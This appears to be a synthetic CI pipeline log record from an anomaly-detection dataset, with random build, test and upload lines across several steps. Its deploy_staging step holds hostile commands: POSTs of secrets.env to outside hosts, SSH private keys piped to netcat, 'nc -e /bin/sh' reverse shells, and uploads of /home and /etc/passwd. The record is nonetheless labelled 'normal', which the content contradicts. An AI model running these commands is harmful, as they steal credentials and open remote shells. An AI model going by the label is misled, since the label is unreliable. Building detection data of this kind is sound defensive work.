          "Step 4/10: Building",
          "Installing axios@2.16.0",
          "Installing lodash@4.9.0",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Installing axios@5.14.0",
          "\u2713 test completed",
          "  PASS: test_user_create (299ms)",
          "[12:00:35] ERROR: Connection failed",
          "\u2713 test completed",
          "Cache hit for key-1971",
          "Compiling src/handler.rs...",
          "Cache hit for key-7384",
          "  PASS: test_user_create (451ms)",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Step 2/10: Building",
          "Cache hit for key-5229",
          "Cache hit for key-8236",
          "  PASS: test_db_connect (288ms)",
          "Installing eslint@1.13.0",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-02T12:02:18.610873",
        "finished_at": "2025-12-02T12:02:25.742925",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-9839",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "Installing webpack@3.13.0",
          "  PASS: test_api_health (49ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Installing jest@2.7.0",
          "Compiling src/main.py...",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_db_connect (319ms)",
          "Cache hit for key-1507",
          "  PASS: test_cache_hit (380ms)",
          "  PASS: test_user_create (75ms)",
          "[12:00:35] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Installing axios@5.7.0",
          "Step 5/10: Building",
          "Cache hit for key-4174",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Step 8/10: Building",
          "\u2717 build failed with exit code 61",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/index.js...",
          "  PASS: test_api_health (380ms)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-4152",
          "Compiling src/utils.go...",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "Installing jest@5.16.0",
          "Installing react@1.20.0",
          "Cache hit for key-3760",
          "Compiling src/utils.go...",
          "Cache hit for key-7915",
          "\u2713 build completed",
          "Installing express@1.15.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_user_create (359ms)",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "  PASS: test_db_connect (489ms)",
          "Installing axios@4.6.0",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-8525",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-3805",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing axios@3.7.0",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (155ms)",
          "\u2713 build completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_user_create (210ms)",
          "\u2713 lint completed",
          "  PASS: test_user_create (176ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 6/10: Building",
          "Installing express@4.19.0",
          "Installing lodash@5.17.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2486",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "FAILED: test_auth_login",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "Installing jest@3.18.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_cache_hit (431ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing webpack@1.2.0",
          "Step 5/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_auth_login (117ms)",
          "Installing express@4.4.0",
          "  PASS: test_auth_login (337ms)",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-3827",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-8645",
          "  PASS: test_api_health (278ms)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 test completed",
          "Cache hit for key-4175",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-02T12:02:25.742925",
        "finished_at": "2025-12-02T12:02:30.022156",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Installing eslint@4.3.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing lodash@3.9.0",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 test completed",
          "  PASS: test_db_connect (255ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:35] INFO: Processing request",
          "Installing webpack@1.7.0",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Cache hit for key-6796",
          "Installing jest@3.10.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing lodash@3.13.0",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "  PASS: test_auth_login (136ms)",
          "Step 5/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-3836",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (463ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing axios@3.3.0",
          "  PASS: test_user_create (199ms)",
          "\u2713 test completed",
          "  PASS: test_db_connect (426ms)",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (220ms)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-7062",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_api_health (295ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Cache hit for key-6047",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:35] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 lint completed",
          "  PASS: test_db_connect (61ms)",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Step 7/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing prettier@2.1.0",
          "Step 10/10: Building",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "\u2713 test completed",
          "FAILED: test_cache_hit",
          "\u2713 lint completed",
          "  PASS: test_db_connect (262ms)",
          "Installing prettier@2.6.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2717 build failed with exit code 111",
          "  PASS: test_auth_login (133ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Installing prettier@4.5.0",
          "  PASS: test_user_create (425ms)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Step 5/10: Building",
          "Installing eslint@4.11.0",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_auth_login (406ms)",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing prettier@1.10.0",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Cache hit for key-6823",
          "\u2713 build completed",
          "  PASS: test_db_connect (215ms)",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Cache hit for key-7047",
          "\u2713 lint completed",
          "Cache hit for key-9596",
          "WARNING: webpack has known vulnerabilities",
          "Installing react@2.20.0",
          "Step 7/10: Building",
          "Step 10/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-4355",
          "Installing jest@5.13.0",
          "Installing react@1.9.0",
          "WARNING: express has known vulnerabilities",
          "FAILED: test_db_connect",
          "  PASS: test_user_create (205ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_cache_hit (189ms)",
          "Installing axios@1.6.0",
          "Compiling src/service.java...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-02T12:02:30.022156",
        "finished_at": "2025-12-02T12:02:51.418312",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (271ms)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Cache hit for key-1992",
          "  PASS: test_api_health (297ms)",
          "Cache hit for key-9124",
          "Installing axios@5.6.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing react@4.8.0",
          "Installing webpack@4.5.0",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2826",
          "Step 9/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 build completed",
          "Installing webpack@1.14.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@2.8.0",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "Installing eslint@1.4.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-2267",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Cache hit for key-1551",
          "  PASS: test_api_health (264ms)",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (323ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:35] ERROR: Connection failed",
          "Cache hit for key-7088",
          "Installing jest@3.5.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "  PASS: test_user_create (113ms)",
          "\u2713 lint completed",
          "Installing lodash@1.16.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 7/10: Building",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3973",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Installing lodash@5.14.0",
          "Installing express@5.15.0",
          "Installing webpack@2.8.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing jest@1.0.0",
          "Cache hit for key-8565",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Installing express@1.14.0",
          "Cache hit for key-5481",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-8144",
          "Installing webpack@5.13.0",
          "Cache hit for key-9040",
          "Cache hit for key-4564",
          "Step 7/10: Building",
          "Cache hit for key-7650",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing eslint@2.9.0",
          "  PASS: test_cache_hit (75ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (257ms)",
          "Cache hit for key-9591",
          "Installing webpack@2.18.0",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Cache hit for key-2907",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_api_health (108ms)",
          "Installing axios@3.18.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_api_health (282ms)",
          "Installing webpack@2.1.0",
          "\u2713 test completed",
          "  PASS: test_db_connect (303ms)",
          "Installing express@1.12.0",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (279ms)",
          "Compiling src/index.js...",
          "Installing prettier@2.17.0",
          "\u2713 test completed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-02T12:02:51.418312",
        "finished_at": "2025-12-02T12:02:58.550364",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "  PASS: test_api_health (392ms)",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing jest@1.1.0",
          "Cache hit for key-1713",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_api_health (448ms)",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "\u2713 build completed",
          "Cache hit for key-1748",
          "[12:00:35] INFO: Processing request",
          "Installing react@2.19.0",
          "Compiling src/utils.go...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 126.3.247.216 38487",
          "Cache hit for key-3476",
          "nc -e /bin/sh 8.15.27.110 1594",
          "Cache hit for key-4774",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-5671",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 27.73.50.89 36628",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Compiling src/utils.go...",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-9082",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (242ms)",
          "Step 10/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 163.150.174.190 30719",
          "[12:00:35] INFO: Processing request",
          "Installing express@3.16.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 3/10: Building",
          "  PASS: test_user_create (134ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2717 build failed with exit code 74",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 10/10: Building",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-4860",
          "Step 3/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Cache hit for key-2367",
          "\u2713 lint completed",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Installing webpack@4.12.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-8540",
          "  PASS: test_user_create (31ms)",
          "Step 1/10: Building",
          "Step 5/10: Building",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (446ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-5264",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 62.182.93.132 45365",
          "Installing eslint@3.17.0",
          "Installing axios@4.17.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (204ms)",
          "\u2713 build completed",
          "Installing react@2.9.0",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 116.209.123.114 19045",
          "Cache hit for key-9869",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Installing axios@3.20.0",
          "  PASS: test_api_health (285ms)",
          "Step 6/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3592",
          "  PASS: test_cache_hit (47ms)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Step 5/10: Building",
          "  PASS: test_user_create (10ms)",
          "\u2713 test completed",
          "  PASS: test_db_connect (10ms)",
          "  PASS: test_api_health (291ms)",
          "Cache hit for key-2237",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Cache hit for key-8808",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 build completed",
          "Sending 211MB of data to startup.dev",
          "Installing react@2.14.0",
          "Cache hit for key-7303",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing express@1.19.0",
          "Step 9/10: Building",
          "Step 3/10: Building",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Installing express@2.20.0",
          "[12:00:35] INFO: Processing request",
          "Sending 169MB of data to test.io",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-6765",
          "Sending 126MB of data to startup.dev",
          "[12:00:35] ERROR: Connection failed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Cache hit for key-2546",
          "Cache hit for key-2225",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (202ms)",
          "\u2713 build completed",
          "  PASS: test_api_health (177ms)",
          "  PASS: test_cache_hit (487ms)",
          "  PASS: test_cache_hit (109ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-4020",
          "Cache hit for key-5161",
          "Installing react@3.14.0",
          "  PASS: test_cache_hit (56ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "[12:00:35] INFO: Processing request",
          "nc -e /bin/sh 56.124.113.178 47710",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (496ms)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_auth_login (283ms)",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "  PASS: test_api_health (170ms)",
          "\u2713 test completed",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}